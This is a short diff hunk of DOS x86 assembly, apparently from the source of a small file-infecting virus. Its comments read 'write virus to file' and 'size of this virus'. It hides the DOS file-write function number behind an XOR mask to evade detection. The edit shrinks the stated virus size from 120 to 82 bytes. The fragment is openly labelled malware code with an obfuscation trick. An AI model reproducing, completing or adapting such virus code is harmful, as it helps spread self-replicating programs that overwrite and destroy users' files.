@@ -29,7 +29,7 @@ SEARCH_LP:
     xchg ax,bx ;write virus to file
     mov ah,12H
     xor ah,52H ; apply mask -> 12H xor 52H = 40H
-    mov cl,120 ;size of this virus
+    mov cl,82 ;size of this virus
     mov dx,100H ;location of this virus
     int 21H
     mov ah,7EH
